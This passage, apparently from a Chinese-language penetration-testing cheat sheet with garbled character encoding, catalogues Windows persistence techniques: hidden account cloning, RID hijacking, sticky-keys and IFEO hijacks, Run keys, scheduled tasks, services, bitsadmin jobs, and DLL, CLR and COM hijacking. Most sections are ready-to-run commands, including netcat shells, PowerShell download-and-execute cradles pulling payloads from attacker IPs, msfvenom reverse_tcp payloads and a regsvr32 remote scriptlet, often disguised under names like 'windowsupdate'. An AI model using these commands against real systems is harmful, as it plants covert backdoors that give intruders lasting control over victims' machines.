è®°å½•HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$çš„é»˜è®¤ç±»å‹000003EA
ä»¥ä¸‹å¯¼å‡ºä¸º2.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA
é»˜è®¤administratoré»˜è®¤ç±»å‹ä¸º000001F4
ä»¥ä¸‹å¯¼å‡ºä¸º3.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4
æŠŠ000001F4(3.reg)çš„Få€¼ç²˜è´´åˆ°000003EA(2.reg)çš„Få€¼
ä¿®æ”¹åå¯¼å…¥
&gt;regedit /s 1.reg
&gt;regedit /s 2.reg
åˆ é™¤net user test$ /del
Powershellè„šæœ¬
https://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1
éœ€systemæƒé™
&gt;Create-Clone -u è¦åˆ›å»ºçš„ -p å¯†ç  -cu æƒ³è¦å…‹éš†çš„
</code></pre>
<p><img src="./img/448.png" alt="image"><br><img src="./img/449.png" alt="image"></p>
<h3 id="RIDåŠ«æŒ"><a href="#RIDåŠ«æŒ" class="headerlink" title="RIDåŠ«æŒ"></a>RIDåŠ«æŒ</h3><pre><code>åˆ©ç”¨åœºæ™¯ï¼š
æ¿€æ´»guestä¿®æ”¹ridä¸ºç®¡ç†å‘˜çš„
ä¿®æ”¹ä½æƒé™ç”¨æˆ·rid
åŠ«æŒridä¹‹å‰æ™®é€šç”¨æˆ·1çš„ridå€¼
</code></pre>
<p><img src="./img/450.png" alt="image"></p>
<pre><code>ä½¿ç”¨msfçš„post/windows/manage/rid_hijackæ¨¡å—
</code></pre>
<p><img src="./img/451.png" alt="image"></p>
<pre><code>è¿è¡Œåå¯ä»¥çœ‹åˆ°å·²ç»å˜ä¸ºè¶…ç®¡çš„ridå€¼
</code></pre>
<p><img src="./img/452.png" alt="image"></p>
<pre><code>æ­¤æ—¶æ™®é€šç”¨æˆ·1ç™»å½•ç³»ç»Ÿæ˜¯ä¸ºè¶…ç®¡æƒé™
</code></pre>
<h3 id="Guestæ¿€æ´»"><a href="#Guestæ¿€æ´»" class="headerlink" title="Guestæ¿€æ´»"></a>Guestæ¿€æ´»</h3><pre><code>æ¿€æ´»æ¥å®¾è´¦æˆ·ï¼Œä¿®æ”¹å…¶å¯†ç ï¼ŒåŠ å…¥administratorsç»„
&gt;net user guest /active:yes
&gt;net user guest 123qwe!@#
&gt;net localgroup administrators guest /ad
</code></pre>
<h3 id="æ˜ åƒåŠ«æŒ-1"><a href="#æ˜ åƒåŠ«æŒ-1" class="headerlink" title="æ˜ åƒåŠ«æŒ"></a>æ˜ åƒåŠ«æŒ</h3><h4 id="Sethc"><a href="#Sethc" class="headerlink" title="Sethc"></a>Sethc</h4><pre><code>&gt;move sethc.exe 1.exe
&gt;copy cmd.exe sethc.exe
5ä¸‹shiftè°ƒç”¨cmd
</code></pre>
<h4 id="è½»æ¾ä½¿ç”¨"><a href="#è½»æ¾ä½¿ç”¨" class="headerlink" title="è½»æ¾ä½¿ç”¨"></a>è½»æ¾ä½¿ç”¨</h4><pre><code>æ³¨å†Œè¡¨
è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
æ–°å»ºUtilman.exeï¼Œæ–°å»ºå­—ç¬¦ä¸²å€¼Debugger,æŒ‡å®šä¸ºC:\Windows\System32\cmd.exe
&gt; REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
</code></pre>
<h4 id="IFEOé™é»˜æ‰§è¡Œ"><a href="#IFEOé™é»˜æ‰§è¡Œ" class="headerlink" title="IFEOé™é»˜æ‰§è¡Œ"></a>IFEOé™é»˜æ‰§è¡Œ</h4><pre><code>è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe æ–°å»ºDWORDå€¼GlobalFlag 16è¿›åˆ¶ä¸º200
åˆ›å»ºï¼šè®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exeå­—ç¬¦ä¸²å€¼ï¼šMonitorProcess=muma.exe
DWORDå€¼ReportingMode=1
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1  /f
&gt;reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f
</code></pre>
<h3 id="æ³¨å†Œè¡¨å¯åŠ¨é¡¹"><a href="#æ³¨å†Œè¡¨å¯åŠ¨é¡¹" class="headerlink" title="æ³¨å†Œè¡¨å¯åŠ¨é¡¹"></a>æ³¨å†Œè¡¨å¯åŠ¨é¡¹</h3><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre>
<h4 id="MSF-9"><a href="#MSF-9" class="headerlink" title="MSF"></a>MSF</h4><pre><code>æ·»åŠ ä¸€ä¸ªç›‘å¬
Meterpreter&gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;
æŸ¥è¯¢æ˜¯å¦æ·»åŠ æˆåŠŸ
Meterpreter&gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Meterpreter&gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
å¼€å¯é˜²ç«å¢™è¿›ç«™è§„åˆ™
&gt; netsh firewall add portopening TCP 444 &quot;name&quot; ENABLE ALL
é‡å¯
&gt; shutdown -r -t 0
</code></pre>
<h4 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD"></a>CMD</h4><pre><code>æŸ¥çœ‹æ³¨å†Œè¡¨å¯åŠ¨é¡¹
&gt;REG query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
æ·»åŠ å¯åŠ¨é¡¹
&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /t REG_SZ /F /D &quot;c:\windows\temp\update.exe&quot;
åˆ é™¤å¯åŠ¨é¡¹
&gt;REG delete &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;windowsupdate&quot; /f
</code></pre>
<h3 id="è®¡åˆ’ä»»åŠ¡-1"><a href="#è®¡åˆ’ä»»åŠ¡-1" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><h4 id="åŠ è½½powershell"><a href="#åŠ è½½powershell" class="headerlink" title="åŠ è½½powershell"></a>åŠ è½½powershell</h4><pre><code>&gt;schtasks /Create /tn åå­— /tr è¿è¡Œç¨‹åº /sc hourly /mo 1
&gt;schtasks /create /S TARGET /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; /TN &quot;STCheck&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.0.107:8080/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;
</code></pre>
<h4 id="æ‰§è¡Œexe"><a href="#æ‰§è¡Œexe" class="headerlink" title="æ‰§è¡Œexe"></a>æ‰§è¡Œexe</h4><pre><code>åˆ›å»ºè®¡åˆ’ä»»åŠ¡
&gt;schtasks /create /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\update.exe&quot; /sc DAILY /mo 1 /ST 12:25 /RU SYSTEM
æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡
&gt;schtasks /query | findstr &quot;windowsupdate&quot;
ç«‹å³æ‰§è¡ŒæŸé¡¹è®¡åˆ’ä»»åŠ¡
&gt;schtasks /run /tn &quot;windowsupdate&quot;
åˆ é™¤æŸé¡¹è®¡åˆ’ä»»åŠ¡
&gt;schtasks /delete /F /tn &quot;windowsupdate&quot;
æ™®é€šç”¨æˆ·æƒé™è®¡åˆ’ä»»åŠ¡
&gt;schtasks /create /F /tn &quot;windowsupdate&quot; /tr &quot;D:\user\zhangsan\file\windowsupdate.exe&quot; /sc DAILY /mo 1 /ST 12:25 
&gt;schtasks /query | findstr &quot;windowsupdate&quot; 
&gt;schtasks /run /tn &quot;windowsupdate&quot; 
&gt;schtasks /delete /F /tn &quot;windowsupdate&quot; 
&gt;schtasks /tn &quot;SysDebug&quot; /query /fo list /v
</code></pre>
<h3 id="è¿›ç¨‹æ³¨å…¥"><a href="#è¿›ç¨‹æ³¨å…¥" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h3><h4 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h4><pre><code>æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\ä¸‹æ–°å»ºAppCertDllsï¼Œæ–°å»ºåå­—ä¸ºDefaultï¼Œå€¼ä¸ºc:\1.dllçš„é¡¹
#msfvenom â€“p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 â€“f dll &gt;/root/1.dll
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/meterpreter/reverse_tcp
https://cdn.securityxploded.com/download/RemoteDLLInjector.zip
&gt; RemoteDLLInjector64.exe PID c:\1.dll
</code></pre>
<h4 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h4><pre><code>æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dllsä¸‹AppInit_DLLsè®¾ç½®ä¸ºc:\1.dllï¼ŒLoadAppInit_DLLsè®¾ç½®ä¸º1
</code></pre>
<h4 id="MSF-10"><a href="#MSF-10" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Msf&gt;use post/windows/manage/reflective_dll_inject
Msf&gt;set session 1
Msf&gt;set pid 1234
Msf&gt;set path c:\\1.dll
Msf&gt;run
&amp;
migrate +pid
&amp;
Meterpreter&gt;run post/windows/manage/migrate
</code></pre>
<h3 id="ç™»å½•åˆå§‹åŒ–"><a href="#ç™»å½•åˆå§‹åŒ–" class="headerlink" title="ç™»å½•åˆå§‹åŒ–"></a>ç™»å½•åˆå§‹åŒ–</h3><pre><code>è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogonä¸‹æ·»åŠ Userinitå€¼
&gt;Powershell.exe Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,c:\muma.exe&quot;
è®¡ç®—æœº\HKEY_CURRENT_USER\Environment
åˆ›å»ºé”®å€¼UserInitMprLogonScriptå€¼ä¸ºc:\muma.exe
&amp;
Powershellå®ç°ï¼š
&gt;Set-ExecutionPolicy RemoteSigned 
ä¿å­˜ps1æ‰§è¡Œ
Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring(&#39;http://192.168.2.11:8080/kaMhC1&#39;);&quot;
# powershellåå¼¹shellçš„payloadå‚ç…§msfä¸­çš„web_deliveryæ¨¡å—
</code></pre>
<h4 id="å±å¹•ä¿æŠ¤ç¨‹åº"><a href="#å±å¹•ä¿æŠ¤ç¨‹åº" class="headerlink" title="å±å¹•ä¿æŠ¤ç¨‹åº"></a>å±å¹•ä¿æŠ¤ç¨‹åº</h4><pre><code>è®¡ç®—æœº\HKEY_CURRENT_USER\Control Panel\Desktop
SCRNSAVE.EXE - é»˜è®¤å±å¹•ä¿æŠ¤ç¨‹åºï¼Œæ”¹ä¸ºæ¶æ„ç¨‹åº(è®¾ç½®å¤‡ä»½)
ScreenSaveActive - 1è¡¨ç¤ºå±å¹•ä¿æŠ¤æ˜¯å¯åŠ¨çŠ¶æ€ï¼Œ0è¡¨ç¤ºè¡¨ç¤ºå±å¹•ä¿æŠ¤æ˜¯å…³é—­çŠ¶æ€
ScreenSaverTimeout - æŒ‡å®šå±å¹•ä¿æŠ¤ç¨‹åºå¯åŠ¨å‰ç³»ç»Ÿçš„ç©ºé—²äº‹ä»¶ï¼Œå•ä½ä¸ºç§’ï¼Œé»˜è®¤ä¸º900ï¼ˆ15åˆ†é’Ÿï¼‰
</code></pre>
<h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><pre><code>&gt;git clone https://github.com/khr0x40sh/metasploit-modules.git
&gt;mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/
&gt;reload_all
&gt;use post/windows/mof_ps_persist
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.108
&gt;set lport 12345
&gt;set session 1
&gt;run
</code></pre>
<p><img src="./img/453.png" alt="image"></p>
<pre><code>&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.108
&gt;set lport 12345
&gt;set exitonsession false
</code></pre>
<p><img src="./img/454.png" alt="image"></p>
<pre><code>é‡å¯åè¿˜ä¼šä¸Šçº¿
</code></pre>
<p><img src="./img/455.png" alt="image"></p>
<pre><code>æ¸…é™¤åé—¨ï¼Œè¿›å…¥meterpreterï¼Œresource ç”Ÿæˆçš„rcæ–‡ä»¶
åœæ­¢MOF
&gt;net stop winmgmt
åˆ é™¤æ–‡ä»¶å¤¹ï¼šC:\WINDOWS\system32\wbem\Repository\
&gt;net start winmgmt 
</code></pre>
<h3 id="WinRMç«¯å£å¤ç”¨"><a href="#WinRMç«¯å£å¤ç”¨" class="headerlink" title="WinRMç«¯å£å¤ç”¨"></a>WinRMç«¯å£å¤ç”¨</h3><pre><code>WinRMç«¯å£5985ï¼Œwin2012ä»¥ä¸Šé»˜è®¤å¯åŠ¨ï¼Œ2008å¼€å¯å‘½ä»¤
&gt;winrm quickconfig -q
2012å¯ç”¨ç«¯å£å¤ç”¨
&gt;winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;
2008å¯ç”¨WinRMåä¿®æ”¹ç«¯å£ä¸º80
&gt;winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;
åé—¨è¿æ¥å’Œä½¿ç”¨
æœ¬åœ°å¼€å¯WinRMå¹¶è®¾ç½®ä¿¡ä»»è¿æ¥ä¸»æœº
&gt;winrm quickconfig -q
&gt;winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;
æ‰§è¡Œå‘½ä»¤
&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all
è·å–cmdshell
&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password cmd
</code></pre>
<p><img src="./img/456.png" alt="image"></p>
<pre><code>åªadministratorå…è®¸è¿œç¨‹ç™»å½•WinRMï¼Œå…è®¸å…¶ä»–ç”¨æˆ·å¯ä»¥ç™»å½•ï¼Œæ‰§è¡Œæ³¨å†Œè¡¨
&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre>
<h3 id="åˆ›å»ºæœåŠ¡"><a href="#åˆ›å»ºæœåŠ¡" class="headerlink" title="åˆ›å»ºæœåŠ¡"></a>åˆ›å»ºæœåŠ¡</h3><pre><code>é‡å¯ç»´æŒnc
&gt;sc create ms binpath= &quot;cmd /K start c:\nc\nc64.exe -d 192.168.0.51 4567 -e cmd.exe&quot; start= delayed-auto error= ignore
é‡å¯ç»´æŒpsh
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=11111 -f psh-reflection &gt;/var/www/html/xxx.ps1
&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/xxx.ps1&#39;)\&quot;&quot; start= delayed-auto error= ignore
</code></pre>
<p><img src="./img/457.png" alt="image"></p>
<pre><code>é‡å¯ç»´æŒCobalt strike
é…ç½®ç›‘å¬å™¨ï¼Œç”Ÿæˆwebä¼ é€’æ¨¡å—Powershellè„šæœ¬
&gt;sc create ms binpath= &quot;cmd /K start C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.0.107:8080/a&#39;))\&quot;&quot; start= delayed-auto error= ignore
</code></pre>
<p><img src="./img/458.png" alt="image"></p>
<pre><code>Delayæ‰§è¡Œå¤§æ¦‚2åˆ†é’Ÿä¸Šçº¿
&gt;sc delete ms å¸è½½æœåŠ¡
Powershell
&gt;powershell.exe new-service -Name nuoyani -BinaryPathName &quot;C:\WINDOWS\Temp\360.exe&quot; -StartupType Automatic
&gt;$c2=&#39;new-&#39;;$c3=&#39;service -Name nuoyani -DisplayName OrderServ -BinaryPathName &quot;C:\accc.exe&quot; -StartupType Automatic&#39;; $Text=$c2+$c3;IEX(-join $Text)
</code></pre>
<h3 id="Bitadmin"><a href="#Bitadmin" class="headerlink" title="Bitadmin"></a>Bitadmin</h3><pre><code>åˆ›å»ºä¸‹è½½ä»»åŠ¡
&gt;bitsadmin /create empire
ä¸‹è½½çš„æ–‡ä»¶è®¾ç½®
&gt;bitsadmin /addfile empire %comspec% c:\windows\temp\1.exe
è®¾ç½®ä¼ è¾“æ—¶è¿è¡Œçš„å‘½ä»¤,MSFvenomç”Ÿæˆdllæ”¾å…¥tempç›®å½•
&gt;bitsadmin /SetNotifyCmdLine empire cmd.exe &quot;cmd.exe /c rundll32 c:\windows\temp\1.dll,0&quot;
(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://x.com/shell.sct scrobj.dll&quot;)
å¯åŠ¨ä»»åŠ¡
&gt;bitsadmin /resume empire
åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·çš„ä¸‹è½½ä»»åŠ¡
&gt;bitsadmin /list /allusers /verbose
</code></pre>
<p><img src="./img/459.png" alt="image"></p>
<pre><code>é‡å¯åä¹Ÿä¼šä¸Šçº¿
</code></pre>
<p><img src="./img/460.png" alt="image"></p>
<pre><code>å®Œæˆä»»åŠ¡
&gt;bitsadmin /complete empire
&gt;bitsadmin /cancel &lt;Job&gt; //åˆ é™¤æŸä¸ªä»»åŠ¡
&gt;bitsadmin /reset /allusers //åˆ é™¤æ‰€æœ‰ä»»åŠ¡
&amp;
&gt;bitsadmin /create mission
&gt;bitsadmin /addfile mission %comspec% %temp%\cmd.exe
&gt;bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe &quot;/u /s /i:http://192.168.0.107/shell.sct scrobj.dll&quot;
&gt;bitsadmin /Resume mission
</code></pre>
<h3 id="CLR-Injection"><a href="#CLR-Injection" class="headerlink" title="CLR Injection"></a>CLR Injection</h3><pre><code>åŠ«æŒè°ƒç”¨.netç¨‹åºï¼Œå¼€æœºå¯åŠ¨
https://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat
</code></pre>
<p><img src="./img/461.png" alt="image"><br><img src="./img/462.png" alt="image"></p>
<pre><code>WMICå¯æ›¿æ¢ä¸ºpowershell
New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null
New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Null

wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;
wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg_x64.dll&quot; /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
æ·»åŠ å…¨å±€å˜é‡
è®¡ç®—æœº\HKEY_CURRENT_USER\Environment
COR_ENABLE_PROFILING=1
COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;
æ³¨å†ŒCLSID
è®¡ç®—æœº\HKEY_CURRENT_USER\Software\Classes\CLSIDæ·»åŠ é¡¹&#123;11111111-1111-1111-1111-111111111111&#125;å’Œå®ƒçš„å­é¡¹InprocServer32
æ–°å»ºä¸€ä¸ªé”®ThreadingModelï¼Œé”®å€¼ä¸ºï¼šApartmentï¼Œé»˜è®¤é”®å€¼ä¸ºdllè·¯å¾„
åŠ«æŒexplorer.exe
&gt;SET COR_ENABLE_PROFILING=1
&gt;SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;
ä½ç½®(æ–°å»º)
HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\InprocServer32é»˜è®¤å€¼ä¸ºæ¶æ„DLL
æ–°å»ºThreadingModelå€¼ä¸ºApartment
</code></pre>
<h3 id="COM-OBJECT-hijacking"><a href="#COM-OBJECT-hijacking" class="headerlink" title="COM OBJECT hijacking"></a>COM OBJECT hijacking</h3><h4 id="CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="CAccPropServicesClass and MMDeviceEnumerato"></a>CAccPropServicesClass and MMDeviceEnumerato</h4><pre><code>æ— éœ€è¶…ç®¡æƒé™ï¼Œæ— éœ€é‡å¯
https://github.com/3gstudent/COM-Object-hijacking
å°†æ¶æ„DLLbase64ç¼–ç å†™å…¥psè„šæœ¬
</code></pre>
<p><img src="./img/463.png" alt="image"><br><img src="./img/464.png" alt="image"></p>
<pre><code>æ‰§è¡Œåä¼šåœ¨
%appdata%\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;ç›®å½•é‡Šæ”¾2ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯x86å’Œx64çš„dll
ä¼šåœ¨æ³¨å†Œè¡¨ä¸­
HKEY_CURRENT_USER\Software\Classes\CLSID\
æ–°å»º
&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;å’Œå­é¡¹é»˜è®¤æŒ‡å‘æ¶æ„DLL
åªè¦æŒ‡å‘.netç¨‹åºä¾¿å¯ä¸Šçº¿ã€‚å¦‚ieï¼Œmmcç­‰
</code></pre>
<p><img src="./img/465.png" alt="image"></p>
<h4 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h4><pre><code>æ³¨å†Œè¡¨ä½ç½®ï¼šHKCU\Software\Classes\CLSID\
åˆ›å»ºé¡¹&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;
åˆ›å»ºå­é¡¹InprocServer32
Defaultçš„é”®å€¼ä¸ºæ¶æ„dllçš„ç»å¯¹è·¯å¾„ï¼šC:\test\1.dll
åˆ›å»ºé”®å€¼ï¼š ThreadingModel REG_SZ Apartment
</code></pre>
<p><img src="./img/466.png" alt="image"></p>
<pre><code>HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;
HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;
HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;
HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;
</code></pre>
<h3 id="Squibledoo"><a href="#Squibledoo" class="headerlink" title="Squibledoo"></a>Squibledoo</h3><pre><code>åˆ›å»º1.sct
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?XML version="1.0"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scriptlet</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>registration</span>
  <span class="token attr-name">description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Component<span class="token punctuation">"</span></span>
  <span class="token attr-name">progid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Component.WindowsUpdate<span class="token punctuation">"</span></span>
  <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.00<span class="token punctuation">"</span></span>
  <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;20002222-0000-0000-0000-000000000002&#125;<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>registration</span><span class="token punctuation">></span></span>
 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>public</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>method</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>public</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token cdata">&lt;![CDATA[
    function exec()&#123;
      new ActiveXObject('WScript.Shell').Run('calc.exe');
    &#125;
  ]]></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scriptlet</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>åˆ›å»ºCOMå¯¹è±¡
&gt;regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll
è§¦å‘
&gt;cscript 1.js
var test = new ActiveXObject(&quot;Component.TESTCB&quot;);
test.exec()
</code></pre>
<h3 id="DLLåŠ«æŒ-1"><a href="#DLLåŠ«æŒ-1" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h3><h4 id="åŠ«æŒ1"><a href="#åŠ«æŒ1" class="headerlink" title="åŠ«æŒ1"></a>åŠ«æŒ1</h4><pre><code>æ³¨å†Œè¡¨
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDllsä¸‹æ·»åŠ  &quot;lpk.dll&quot;(è‹¥æ— ï¼Œè‡ªå·±åˆ›å»º)
ExcludeFromKnownDllså¯ä½¿KnownDLLså¤±æ•ˆ
éœ€è¦é‡æ–°å¯åŠ¨ç”µè„‘
æŸ¥æ‰¾å¯åŠ«æŒçš„DLLï¼š
1.å¯åŠ¨ç¨‹åº
